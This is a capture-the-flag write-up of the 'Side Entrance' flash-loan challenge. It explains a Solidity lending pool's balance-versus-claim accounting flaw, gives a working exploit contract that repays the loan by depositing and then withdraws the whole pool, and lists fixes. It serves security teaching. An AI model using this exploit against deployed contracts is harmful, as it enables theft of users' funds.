# 04 — Side Entrance

**Class:** Flash-loan repayment via a state-changing side entrance (accounting
confusion between "balance" and "claim")
**Goal:** Drain the pool's 1000 ETH to the recovery account.

## The setup

`SideEntranceLenderPool` lets anyone `deposit()` ETH (credited to
`balances[msg.sender]`) and `withdraw()` it later. It also offers a free flash
loan:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) revert RepayFailed();
}
```

## Root cause

The only repayment check is *"the pool's ETH balance did not drop."* But the pool
exposes a second door — `deposit()` — that **restores the balance while also
crediting the depositor**. So an attacker can repay the loan *by depositing it*:
the balance invariant is satisfied, yet the attacker now holds a `balances[]`
claim equal to the entire loan, redeemable via `withdraw()`.

The bug is treating a raw ETH-balance snapshot as proof of solvency while a
parallel liability (`balances`) is being created for free.

## Exploit

```solidity
function attack() external {
    uint256 amount = address(pool).balance;
    pool.flashLoan(amount);   // pool calls execute() below
    pool.withdraw();          // reclaim the credited balance
    payable(recovery).call{value: address(this).balance}("");
}

// flash-loan callback: "repay" by depositing -> credits us the full amount
function execute() external payable {
    pool.deposit{value: msg.value}();
}
```

The pool's balance is 1000 ETH before and after the loan (satisfying
`RepayFailed`), but `balances[exploit]` is now 1000 ETH, which `withdraw()` pays
out — draining the pool with its own liquidity.

## Remediation

- Track loaned funds explicitly rather than trusting `address(this).balance`.
  Snapshot the balance, require it to be **strictly greater by the fee**, and
  ensure the repayment path can't simultaneously mint an internal claim.
- Add reentrancy protection (`nonReentrant`) across `flashLoan`, `deposit`, and
  `withdraw`, and disallow interacting with other pool functions while a loan is
  outstanding (e.g. a "loan in progress" lock).

## Real-world parallel

This is the canonical **flash-loan self-repayment / balance-vs-liability
confusion**. Any lending or vault contract whose solvency check reads a live
balance that a second function can inflate for free is exposed.
